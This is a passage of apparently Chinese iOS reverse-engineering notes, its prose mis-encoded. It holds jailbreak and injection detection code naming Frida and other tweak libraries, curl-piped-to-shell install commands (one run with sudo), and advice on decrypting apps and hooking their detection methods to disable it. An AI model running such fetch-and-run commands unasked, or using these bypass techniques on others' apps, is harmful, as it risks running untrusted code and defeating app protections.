                A('z'),
                A('z'),
                A('L'),
                A('i'),
                A('b'),
                A('e'),
                A('r'),
                A('t'),
                A('y'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            char sslkillswitch2dylib[] = {
                A('S'),
                A('S'),
                A('L'),
                A('K'),
                A('i'),
                A('l'),
                A('l'),
                A('S'),
                A('w'),
                A('i'),
                A('t'),
                A('c'),
                A('h'),
                A('2'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char zeroshadowdylib[] = {
                A('0'),
                A('S'),
                A('h'),
                A('a'),
                A('d'),
                A('o'),
                A('w'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char mobilesubstratedylib[] = {
                A('M'),
                A('o'),
                A('b'),
                A('i'),
                A('l'),
                A('e'),
                A('S'),
                A('u'),
                A('b'),
                A('s'),
                A('t'),
                A('r'),
                A('a'),
                A('t'),
                A('e'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char libsparkapplistdylib[] = {
                A('l'),
                A('i'),
                A('b'),
                A('s'),
                A('p'),
                A('a'),
                A('r'),
                A('k'),
                A('a'),
                A('p'),
                A('p'),
                A('l'),
                A('i'),
                A('s'),
                A('t'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char SubstrateInserterdylib[] = {
                A('S'),
                A('u'),
                A('b'),
                A('s'),
                A('t'),
                A('r'),
                A('a'),
                A('t'),
                A('e'),
                A('I'),
                A('n'),
                A('s'),
                A('e'),
                A('r'),
                A('t'),
                A('e'),
                A('r'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char zzzzzzUnSubdylib[] = {
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('U'),
                A('n'),
                A('S'),
                A('u'),
                A('b'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
                
            };
            
            char kor[] = {
                A('.'),
                A('.'),
                A('.'),
                A('!'),
                A('@'),
                A('#'),
                0
            };
            char cephei[] = {
                A('/'),A('u'),A('s'),A('r'),A('/'),A('l'),A('i'),A('b'),A('/'),A('C'),A('e'),A('p'),A('h'),A('e'),A('i'),A('.'),A('f'),A('r'),A('a'),A('m'),A('e'),A('w'),A('o'),A('r'),A('k'),A('/'),A('C'),A('e'),A('p'),A('h'),A('e'),A('i'),
                0
            };
            if (tuyul(name, decryptString(cephei)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(kor)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(mobilesubstratedylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if(tuyul(name, decryptString(libsparkapplistdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(cyinjectHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(libcycriptHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(libfridaHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zzzzLibertyDylibHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(sslkillswitch2dylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zeroshadowdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(SubstrateInserterdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zzzzzzUnSubdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
        }
    }
    return NO;
}

// Returns true if the current process is being debugged (either
// running under the debugger or has a debugger attached post facto).
// Thanks to https://developer.apple.com/library/archive/qa/qa1361/_index.html
BOOL isDebugged()
{
    int junk;
    int mib[4];
    struct kinfo_proc info;
    size_t size;
    info.kp_proc.p_flag = 0;
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();
    size = sizeof(info);
    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);
    return ( (info.kp_proc.p_flag & P_TRACED) != 0 );
}

BOOL isFromAppStore()
{
    #if TARGET_IPHONE_SIMULATOR
        return NO;
    #else
        NSString *provisionPath = [[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"];
        if (nil == provisionPath || 0 == provisionPath.length) {
            return YES;
        }
        return NO;
    #endif
}

BOOL isSecurityCheckPassed()
{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !isJb() && !isInjectedWithDynamicLibrary() && !isDebugged();
    
}

@end
```

## Homebrewå›½å†…å®‰è£…
### è‡ªåŠ¨è„šæœ¬(å…¨éƒ¨å›½å†…åœ°å€)ï¼ˆåœ¨Macç»ˆç«¯ä¸­å¤åˆ¶ç²˜è´´å›è½¦ä¸‹é¢è„šæœ¬)
å®‰è£…è„šæœ¬ï¼š
```
/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)"
```
å¸è½½è„šæœ¬ï¼š
```
/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)"
```

## curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to raw.githubusercontent.com:443 
### æ­¤å¤„å‡ºç°æŠ¥é”™, è¯æ˜å½“å‰ç½‘ç»œä¸è¡Œ, åˆ‡æ¢å¦å¤–çš„ç½‘ç»œ/çƒ­ç‚¹å°±è¡Œ
```
$     sudo /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)"
curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to raw.githubusercontent.com:443 
æ­¤å¤„å‡ºç°æŠ¥é”™, è¯æ˜å½“å‰ç½‘ç»œä¸è¡Œ, åˆ‡æ¢å¦å¤–çš„ç½‘ç»œ/çƒ­ç‚¹å°±è¡Œ
Password:
$     sudo /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)"
Downloading MonkeyDev base from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3452k  100 3452k    0     0   4256      0  0:13:50  0:13:50 --:--:-- 10751
Downloading Xcode templates from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  306k    0  306k    0     0  16915      0 --:--:--  0:00:18 --:--:-- 14798
Downloading frida-ios-dump from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9669  100  9669    0     0   1012      0  0:00:09  0:00:09 --:--:--   396
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11727  100 11727    0     0   3273      0  0:00:03  0:00:03 --:--:--  3273
Creating symlink to Xcode templates...
Modifying Bash personal initialization file...
   
```

## å¦‚ä½•æ£€æµ‹è¶Šç‹±è®¾å¤‡
ä¸ºæ–¹ä¾¿èµ·è§ï¼Œâ€œæ¶æ„åº”ç”¨ç¨‹åºâ€å°†æŒ‡App Storeä¸­ä»»ä½•å¯ä¸»åŠ¨å®æ–½è¶Šç‹±æ£€æµ‹æªæ–½çš„åº”ç”¨ç¨‹åºã€‚
åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¶Šç‹±æ£€æµ‹ç¨‹åºå¹¶ä¸åƒäººä»¬æƒ³è±¡çš„é‚£ä¹ˆå¤æ‚ã€‚å°½ç®¡åº”ç”¨ç¨‹åºå¯ä»¥é‡‡ç”¨å¤šç§æ–¹å¼å¯¹è¶Šç‹±è®¾å¤‡è¿›è¡Œæ£€æŸ¥ï¼Œä½†é€šå¸¸å¯ä»¥å½’ç»“ä¸ºä»¥ä¸‹å‡ ç‚¹ï¼š

ç›®å½•çš„å­˜åœ¨ -æµæ°“åº”ç”¨å–œæ¬¢åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ£€æŸ¥/Applications/Cydia.app/å’Œ/ private / var / stashç­‰è·¯å¾„ã€‚
å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™äº›æ˜¯ä½¿ç”¨NSFileManagerä¸­çš„-ï¼ˆBOOLï¼‰fileExistsAtPathï¼šï¼ˆNSString *ï¼‰pathæ–¹æ³•è¿›è¡Œæ£€æŸ¥çš„ï¼Œ
ä½†æ˜¯æ›´å¤šå·å·æ‘¸æ‘¸çš„åº”ç”¨ç¨‹åºå–œæ¬¢ä½¿ç”¨è¾ƒä½çº§åˆ«çš„Cå‡½æ•°ï¼Œä¾‹å¦‚fopenï¼ˆï¼‰ï¼Œstatï¼ˆï¼‰æˆ–accessï¼ˆï¼‰ã€‚

ç›®å½•æƒé™ -ç±»ä¼¼äºæ£€æŸ¥ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œä½†æ˜¯ä½¿ç”¨NSFileManageræ–¹æ³•ä»¥åŠstatfsï¼ˆï¼‰ä¹‹ç±»çš„Cå‡½æ•°æ¥æ£€æŸ¥ç³»ç»Ÿä¸Šç‰¹å®šæ–‡ä»¶å’Œç›®å½•çš„Unixæ–‡ä»¶æƒé™ã€‚
åœ¨è¶Šç‹±è®¾å¤‡ä¸Šçš„ç›®å½•è®¿é—®æƒé™è¦æ¯”ä»åœ¨ç›‘ç‹±ä¸­çš„ç›®å½•è¦å¤šã€‚

æµç¨‹fork -æ²™ç›’ä¸ä¼šæ‹’ç»App Storeåº”ç”¨ç¨‹åºä½¿ç”¨forkï¼ˆï¼‰ï¼Œpopenï¼ˆï¼‰æˆ–ä»»ä½•å…¶ä»–Cå‡½æ•°åœ¨è¶Šç‹±è®¾å¤‡ä¸Šåˆ›å»ºå­è¿›ç¨‹çš„èƒ½åŠ›ã€‚
æ²™ç›’æ˜ç¡®æ‹’ç»åœ¨è¶Šç‹±ä¸­çš„è®¾å¤‡ä¸Šè¿›è¡Œè¿›ç¨‹forkã€‚é€šè¿‡æ£€æŸ¥forkï¼ˆï¼‰ä¸Šè¿”å›çš„pidï¼Œæµæ°“åº”ç”¨ç¨‹åºå¯ä»¥åˆ¤æ–­å®ƒæ˜¯å¦å·²æˆåŠŸforkï¼Œè¿™æ—¶å¯ä»¥ç¡®å®šè®¾å¤‡çš„è¶Šç‹±çŠ¶æ€ã€‚

SSHç¯å›è¿æ¥ -åªæœ‰æå°‘æ•°çš„åº”ç”¨ç¨‹åºå¯ä»¥å®ç°æ­¤ç›®çš„ï¼ˆå› ä¸ºå®ƒä¸å¦‚å…¶ä»–åº”ç”¨ç¨‹åºæœ‰æ•ˆï¼‰ã€‚
ç”±äºå®‰è£…äº†OpenSSHçš„è¶Šç‹±è®¾å¤‡çš„æ¯”ä¾‹å¾ˆå¤§ï¼ŒæŸäº›æ¶æ„åº”ç”¨ç¨‹åºå°†å°è¯•åœ¨ç«¯å£22ä¸Šå»ºç«‹ä¸127.0.0.1çš„è¿æ¥ã€‚
å¦‚æœè¿æ¥æˆåŠŸï¼Œåˆ™è¡¨æ˜OpenSSHå·²åœ¨è®¾å¤‡ä¸Šå®‰è£…å¹¶è¿è¡Œï¼Œè¿™æ˜¾ç„¶è¡¨æ˜è¶Šç‹±äº†

systemï¼ˆï¼‰ -åœ¨ç›‘ç‹±ä¸­çš„è®¾å¤‡ä¸Šä½¿ç”¨NULLå‚æ•°è°ƒç”¨systemï¼ˆï¼‰å‡½æ•°å°†è¿”å›0ï¼›å¦åˆ™ï¼Œå°†è¿”å›0ã€‚åœ¨è¶Šç‹±è®¾å¤‡ä¸Šæ‰§è¡Œç›¸åŒæ“ä½œå°†è¿”å›1ã€‚
è¿™æ˜¯å› ä¸ºè¯¥åŠŸèƒ½å°†æ£€æŸ¥æ˜¯å¦/bin/shå­˜åœ¨ï¼Œå¹¶ä¸”ä»…åœ¨è¶Šç‹±è®¾å¤‡ä¸Šæ‰å¦‚æ­¤

dyldå‡½æ•° -è¿„ä»Šä¸ºæ­¢æœ€éš¾è§£å†³çš„é—®é¢˜ã€‚è°ƒç”¨è¯¸å¦‚_dyld_image_countï¼ˆï¼‰å’Œ_dyld_get_image_nameï¼ˆï¼‰ä¹‹ç±»çš„å‡½æ•°ï¼Œä»¥æŸ¥çœ‹å½“å‰æ­£åœ¨åŠ è½½å“ªäº›dylibã€‚
ä¿®è¡¥éå¸¸å›°éš¾ï¼Œå› ä¸ºä¿®è¡¥æœ¬èº«å°±æ˜¯dylibçš„ä¸€éƒ¨åˆ†ã€‚

## å¦‚ä½•å¯¹iOS Appè¿›è¡Œé€†å‘å·¥ç¨‹
ä¸ºäº†ä»App Storeä¸­è½¬å‚¨æˆ–åæ±‡ç¼–åº”ç”¨ç¨‹åºï¼Œå³ä½¿å®ƒæ˜¯å…è´¹çš„åº”ç”¨ç¨‹åºï¼Œä¹Ÿå¿…é¡»é¦–å…ˆå°†å…¶è§£å¯†ï¼ˆé€šå¸¸ç§°ä¸ºâ€œ ç ¸å£³ â€ï¼‰ã€‚

åœ¨åº”ç”¨ç¨‹åºçš„è§£å¯†äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šä½¿ç”¨class-dumpå°†è½¬å‚¨æ‰€æœ‰å¤´æ–‡ä»¶ã€‚æœ‰æ—¶ï¼Œå®ƒä»¬åŒ…å«â€œèµ äºˆâ€æ–¹æ³•åç§°ï¼Œ
ä¾‹å¦‚â€œ deviceIsJailbrokenâ€æˆ–â€œ checkDeviceSecurityâ€ã€‚é€šå¸¸ï¼ŒæŒ‚æ¥è¿™äº›æ–¹æ³•è¶³ä»¥ç¦ç”¨è¶Šç‹±æ£€æµ‹æªæ–½ï¼Œä½†å‡ ä¹å¯ä»¥ä¿è¯è¯¥è¡¥ä¸å°†æ— æ³•åœ¨å…¶ä»–åº”ç”¨ç¨‹åºä¸Šè¿è¡Œã€‚

ä½¿ç”¨Objective-Cè§£æåŠŸèƒ½åœ¨IDAä¸­è·Ÿè¸ªç±»ä¼¼åç§°çš„æ–¹æ³•å¯ä»¥å¸®åŠ©æ‚¨å‡†ç¡®åœ°ç¡®å®šä½¿ç”¨å“ªç§æ–¹æ³•æ¥æ£€æµ‹è¶Šç‹±ã€‚
å¦‚æœç±»è½¬å‚¨çš„å¤´æ–‡ä»¶æ²¡æœ‰ç»™å‡ºä»»ä½•å†…å®¹ï¼Œåˆ™åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æœç´¢â€œ jailâ€ï¼Œâ€œ cydiaâ€ï¼Œâ€œ aptâ€ç­‰å­—ç¬¦ä¸²é€šå¸¸ä¼šå¯¼è‡´æ–­ç‚¹ã€‚

----------------------------------------------------------------------------------------------------------------
# æ±‡ç¼–è¯­è¨€  Assembly

ç­”ï¼šæ±‡ç¼–è¯­è¨€æ˜¯è®¡ç®—æœºè¯­è¨€ï¼Œé€šä¿—æ¥è®²å°±æ˜¯äººç±»ä¸è®¡ç®—æœº(CPU)äº¤æµçš„æ¡¥æ¢ï¼Œ
è®¡ç®—æœºä¸è®¤è¯†äººç±»çš„è¯­è¨€ï¼Œæƒ³è¦è®©è®¡ç®—æœºå»å®Œæˆäººä»¬çš„å·¥ä½œï¼Œå°±éœ€è¦ä¿ºä»¬å°†è¿™äº›å·¥ä½œç¿»è¯‘æˆè®¡ç®—æœºè¯­è¨€ï¼Œå±äºä½çº§è®¡ç®—æœºè¯­è¨€ã€‚

iOS Appä¸æ±‡ç¼–è¯­è¨€çš„å…³ç³»
ä¸€ä¸ªAPPå®‰è£…åˆ°æ“ä½œç³»ç»Ÿä¸Šé¢çš„å¯æ‰§è¡Œçš„æ–‡ä»¶æœ¬è´¨ä¸Šæ¥è®²å°±æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ“ä½œç³»ç»Ÿæœ¬è´¨ä¸Šæ‰§è¡Œçš„æŒ‡ä»¤ä¹Ÿæ˜¯äºŒè¿›åˆ¶ï¼Œæ˜¯ç”±CPUæ‰§è¡Œçš„ï¼›

## Assembly å’Œ fishhook
Objective-Cçš„æ–¹æ³•åœ¨ç¼–è¯‘åä¼šèµ°objc_msgSendï¼Œæ‰€ä»¥é€šè¿‡fishhookæ¥hookè¿™ä¸€ä¸ªCå‡½æ•°å³å¯è·å¾—Objective-Cç¬¦å·
ç”±äºobjc_msgSendæ˜¯å˜é•¿å‚æ•°ï¼Œæ‰€ä»¥hookä»£ç éœ€è¦ç”¨æ±‡ç¼–æ¥å®ç°ï¼š
```
 1//ä»£ç å‚è€ƒInspectiveC
 2__attribute__((__naked__))
 3static void hook_Objc_msgSend() {
 4    save()
 5    __asm volatile ("mov x2, lr\n");
 6    __asm volatile ("mov x3, x4\n");
 7    call(blr, &before_objc_msgSend)
 8    load()
 9    call(blr, orig_objc_msgSend)
10    save()
11    call(blr, &after_objc_msgSend)
12    __asm volatile ("mov lr, x0\n");
13    load()
14    ret()
15}
```
å­ç¨‹åºè°ƒç”¨æ—¶å€™è¦ä¿å­˜å’Œæ¢å¤å‚æ•°å¯„å­˜å™¨ï¼Œ
æ‰€ä»¥saveå’Œloadåˆ†åˆ«å¯¹x0~x9, q0~q9å…¥æ ˆ/å‡ºæ ˆã€‚
callåˆ™é€šè¿‡å¯„å­˜å™¨æ¥é—´æ¥è°ƒç”¨å‡½æ•°ï¼š
```
 1#define save() \
 2__asm volatile ( \
 3"stp q6, q7, [sp, #-32]!\n"\
 4...
 5
 6#define load() \
 7__asm volatile ( \
 8"ldp x0, x1, [sp], #16\n" \
 9...
10
11#define call(b, value) \
12__asm volatile ("stp x8, x9, [sp, #-16]!\n"); \
13__asm volatile ("mov x12, %0\n" :: "r"(value)); \
14__asm volatile ("ldp x8, x9, [sp], #16\n"); \
15__asm volatile (#b " x12\n");
```
åœ¨before_objc_msgSendä¸­ç”¨æ ˆä¿å­˜lrï¼Œåœ¨after_objc_msgSendæ¢å¤lrã€‚
ç”±äºè¦ç”Ÿæˆtraceæ–‡ä»¶ï¼Œä¸ºäº†é™ä½æ–‡ä»¶çš„å¤§å°ï¼Œç›´æ¥å†™å…¥çš„æ˜¯å‡½æ•°åœ°å€ï¼Œä¸”åªæœ‰å½“å‰å¯æ‰§è¡Œæ–‡ä»¶çš„Mach-O(appå’ŒåŠ¨æ€åº“)ä»£ç æ®µæ‰ä¼šå†™å…¥ï¼š

iOSä¸­ï¼Œç”±äºALSR(https://en.wikipedia.org/wiki/Address_space_layout_randomization)çš„å­˜åœ¨ï¼Œåœ¨å†™å…¥ä¹‹å‰éœ€è¦å…ˆå‡å»åç§»é‡slideï¼š
```
1IMP imp = (IMP)class_getMethodImplementation(object_getClass(self), _cmd);
2unsigned long imppos = (unsigned long)imp;
3unsigned long addr = immpos - macho_slide
```
è·å–ä¸€ä¸ªäºŒè¿›åˆ¶çš„__textæ®µåœ°å€èŒƒå›´ï¼š
```
1unsigned long size = 0;
2unsigned long start = (unsigned long)getsectiondata(mhp,  "__TEXT", "__text", &size);
3unsigned long end = start + size;
è·å–åˆ°å‡½æ•°åœ°å€åï¼ŒåæŸ¥linkmapæ—¢å¯æ‰¾åˆ°æ–¹æ³•çš„ç¬¦å·åã€‚
```

iOSçš„blockæ˜¯ä¸€ç§ç‰¹æ®Šçš„å•å…ƒï¼Œblockåœ¨ç¼–è¯‘åçš„å‡½æ•°ä½“æ˜¯ä¸€ä¸ªCå‡½æ•°ï¼Œ
åœ¨è°ƒç”¨çš„æ—¶å€™ç›´æ¥é€šè¿‡æŒ‡é’ˆè°ƒç”¨ï¼Œå¹¶ä¸èµ°objc_msgSendï¼Œæ‰€ä»¥éœ€è¦å•ç‹¬hookã€‚

é€šè¿‡Blockçš„æºç å¯ä»¥çœ‹åˆ°blockçš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š
```
 1struct Block_layout {
 2    void *isa;
 3    int32_t flags; // contains ref count
 4    int32_t reserved;
 5    void  *invoke;
 6    struct Block_descriptor1 *descriptor;
 7};
 8struct Block_descriptor1 {
 9    uintptr_t reserved;
10    uintptr_t size;
11};
```
å…¶ä¸­invokeå°±æ˜¯å‡½æ•°çš„æŒ‡é’ˆï¼Œhookæ€è·¯æ˜¯å°†invokeæ›¿æ¢ä¸ºè‡ªå®šä¹‰å®ç°ï¼Œç„¶ååœ¨reservedä¿å­˜ä¸ºåŸå§‹å®ç°ã€‚
```
1
2if (layout->descriptor != NULL && layout->descriptor->reserved == NULL)
3{
4    if (layout->invoke != (void *)hook_block_envoke)
5    {
6        layout->descriptor->reserved = layout->invoke;
7        layout->invoke = (void *)hook_block_envoke;
8    }
9}
```
ç”±äºblockå¯¹åº”çš„å‡½æ•°ç­¾åä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä»ç„¶é‡‡ç”¨æ±‡ç¼–æ¥å®ç°hook_block_envokeï¼š
```
 1__attribute__((__naked__))
 2static void hook_block_envoke() {
 3    save()
 4    __asm volatile ("mov x1, lr\n");
 5    call(blr, &before_block_hook);
 6    __asm volatile ("mov lr, x0\n");
 7    load()
 8    //è°ƒç”¨åŸå§‹çš„invokeï¼Œå³resveredå­˜å‚¨çš„åœ°å€
 9    __asm volatile ("ldr x12, [x0, #24]\n");
10    __asm volatile ("ldr x12, [x12]\n");
11    __asm volatile ("br x12\n");
12}
```

åœ¨before_block_hookä¸­è·å¾—å‡½æ•°åœ°å€ï¼ˆåŒæ ·è¦å‡å»slideï¼‰ã€‚
```
1intptr_t before_block_hook(id block,intptr_t lr)
2{
3    Block_layout * layout = (Block_layout *)block;
4    //layout->descriptor->reservedå³blockçš„å‡½æ•°åœ°å€
5    return lr;
6}
```
åŒæ ·ï¼Œé€šè¿‡å‡½æ•°åœ°å€åæŸ¥linkmapæ—¢å¯æ‰¾åˆ°blockç¬¦å·

### .s æ±‡ç¼–è¯­è¨€æºç¨‹åº;  æ“ä½œ: æ±‡ç¼–
### .S æ±‡ç¼–è¯­è¨€æºç¨‹åº;  æ“ä½œ: é¢„å¤„ç† + æ±‡ç¼–

```
1.å°å†™çš„ sæ–‡ä»¶ï¼Œåœ¨åæœŸé˜¶æ®µä¸ä¼šå†è¿›è¡Œé¢„å¤„ç†æ“ä½œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åœ¨å…¶å†…å†™ä¸Šé¢„å¤„ç†è¯­å¥ã€‚

    ä¸€èˆ¬æ˜¯ .c æ–‡ä»¶ç»è¿‡æ±‡ç¼–å™¨å¤„ç†åçš„è¾“å‡ºã€‚ å¦‚ GCC ç¼–è¯‘å™¨å°±å¯ä»¥æŒ‡å®š -S é€‰é¡¹è¿›è¡Œè¾“å‡ºï¼Œ ä¸”æ˜¯ç»è¿‡é¢„å¤„ç†å™¨å¤„ç†åçš„äº†ã€‚

2.å¤§å†™çš„ S æ–‡ä»¶ï¼Œè¿˜ä¼šè¿›è¡Œé¢„å¤„ç†ã€æ±‡ç¼–ç­‰æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œé¢åŠ å…¥é¢„å¤„ç†çš„å‘½ä»¤ã€‚ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ±‡ç¼–å¤§ S 

    æ–‡ä»¶ä¹‹å‰ä¼šè¿›è¡Œé¢„å¤„ç†æ“ä½œã€‚

    å¸¸ç”¨è¿™ç§å½¢å¼çš„æ±‡ç¼–æ–‡ä»¶ä½œä¸ºå·¥ç¨‹å†…çš„æ±‡ç¼–æºæ–‡ä»¶(å¦‚ Linux å’Œ u-boot)ï¼Œ å› ä¸ºåœ¨æ–‡ä»¶å†…å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½¿ç”¨å¸¸ç”¨çš„

    é¢„å¤„ç†æŒ‡ä»¤æ¥è¿›è¡Œå®å®šä¹‰ï¼Œæ¡ä»¶ç¼–è¯‘ï¼Œ å’Œæ–‡ä»¶åŒ…å«æ“ä½œã€‚

    å¦‚: #include, #define, #ifdef, #else, #if, #elif, #endif ç­‰é¢„å¤„ç†æŒ‡ä»¤ã€‚

    å…·ä½“çš„åº”ç”¨å¯ä»¥å‚è€ƒ Linux æˆ–è€… u-boot çš„ .S æºä»£ç ã€‚
----------------------------------------------------------------------------

    asm(æ±‡ç¼–);

åœ¨é’ˆå¯¹ARMä½“ç³»ç»“æ„çš„ç¼–ç¨‹ä¸­ï¼Œä¸€èˆ¬å¾ˆéš¾ç›´æ¥ä½¿ç”¨Cè¯­è¨€äº§ç”Ÿæ“ä½œåå¤„ç†å™¨çš„ç›¸å…³ä»£ç ï¼Œå› æ­¤ä½¿ç”¨æ±‡ç¼–è¯­è¨€æ¥å®ç°å°±æˆä¸ºäº†å”¯ä¸€çš„é€‰æ‹©ã€‚

ä½†å¦‚æœå®Œå…¨é€šè¿‡æ±‡ç¼–ä»£ç å®ç°ï¼Œåˆä¼šè¿‡äºå¤æ‚ã€éš¾ä»¥è°ƒè¯•ã€‚å› æ­¤ï¼ŒCè¯­è¨€å†…åµŒæ±‡ç¼–çš„æ–¹å¼å€’æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚

ç„¶è€Œï¼Œä½¿ç”¨å†…è”æ±‡ç¼–çš„ä¸€ä¸ªä¸»è¦é—®é¢˜æ˜¯ï¼Œå†…è”æ±‡ç¼–çš„è¯­æ³•æ ¼å¼ä¸ä½¿ç”¨çš„ç¼–è¯‘å™¨ç›´æ¥ç›¸å…³ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨ä¸åŒçš„Cç¼–è¯‘å™¨å†…è”æ±‡ç¼–ä»£ç æ—¶ï¼Œå®ƒä»¬çš„å†™æ³•æ˜¯å„ä¸ç›¸åŒçš„ã€‚

ä¸‹é¢ä»‹ç»åœ¨ARMä½“ç³»ç»“æ„ä¸‹GCCçš„å†…è”æ±‡ç¼–ã€‚GCCå†…è”æ±‡ç¼–çš„ä¸€èˆ¬æ ¼å¼ï¼šasm(æ±‡ç¼–);

asm(   
 
 
    ä»£ç åˆ—è¡¨   
    : è¾“å‡ºè¿ç®—ç¬¦åˆ—è¡¨   
    : è¾“å…¥è¿ç®—ç¬¦åˆ—è¡¨   
    : è¢«æ›´æ”¹èµ„æºåˆ—è¡¨   
);

åœ¨Cä»£ç ä¸­åµŒå…¥æ±‡ç¼–éœ€è¦ä½¿ç”¨asmå…³é”®å­—ï¼Œåœ¨asmçš„ä¿®é¥°ä¸‹ï¼Œä»£ç åˆ—è¡¨ã€è¾“å‡ºè¿ç®—ç¬¦åˆ—è¡¨ã€è¾“å…¥è¿ç®—ç¬¦åˆ—è¡¨å’Œè¢«æ›´æ”¹çš„èµ„æºåˆ—è¡¨è¿™4ä¸ªéƒ¨åˆ†è¢«3ä¸ªâ€œ:â€åˆ†éš”ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼š

void test(void) 
{   
    â€¦â€¦   
    asm(   
        "mov r1,#1\n"   
        :   
        :   
        :"r1"   
    );   
    â€¦â€¦   
} 

æ³¨ï¼šæ¢è¡Œç¬¦å’Œåˆ¶è¡¨ç¬¦çš„ä½¿ç”¨å¯ä»¥ä½¿å¾—æŒ‡ä»¤åˆ—è¡¨çœ‹èµ·æ¥å˜å¾—ç¾è§‚ã€‚ä½ ç¬¬ä¸€æ¬¡çœ‹èµ·æ¥å¯èƒ½æœ‰ç‚¹æ€ªå¼‚ï¼Œä½†æ˜¯å½“Cç¼–è¯‘å™¨ç¼–è¯‘Cè¯­å¥çš„æ˜¯å€™ï¼Œå®ƒå°±æ˜¯æŒ‰ç…§ä¸Šé¢ï¼ˆæ¢è¡Œå’Œåˆ¶è¡¨ï¼‰ç”Ÿæˆæ±‡ç¼–çš„ã€‚

